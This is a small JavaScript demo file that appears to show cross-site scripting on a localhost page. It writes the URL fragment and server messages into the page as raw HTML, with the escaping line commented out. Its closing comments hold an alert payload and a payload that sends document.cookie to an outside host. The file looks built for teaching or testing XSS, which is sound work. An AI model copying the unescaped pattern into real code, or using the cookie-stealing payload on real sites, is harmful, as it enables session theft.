function getList(){
	$.ajax({
        url: '/message?message='+ $(".ms").val(),
        type: 'GET',
        dataType: 'json',
        async: false,
        success: function(res) {
            $(".ms").val('')
        	$('ul').html('');
        	// debugger
        	for(var i=0;i<res.length;i++){
        		console.log(res[i])
 				$('ul').prepend('<li>'+res[i]+'</li>');
        	}
        }
    });
}
getList();
document.cookie="name=lianjiafe"
// debugger
// var text = location.hash.replace('#','').replace(/</g,"&lt;").replace(/>/g,"&gt;"); 
var text = location.hash.replace('#',''); 
$('#a').html(text);
// $('#a').html(location.hash.replace('#',''));
$('.bt').on("click",function(){
	getList();
})

function save(){
    var data={
        "_csrf":$('[name="_csrf"]').val()
    }
    // data = JSON.stringify(data)
    // debugger
    $.ajax({
        url: '/postFormData',
        type: 'POST',
        dataType: 'json',
        async: false,
        data:data,
        success: function(res) {
            console.log(res)
        }
    });
    return false
}

//http://localhost:3000/#<script>alert(1)</script>
//http://localhost:3000/#<script>location.href="http://www.baidu.com/?"+document.cookie</script>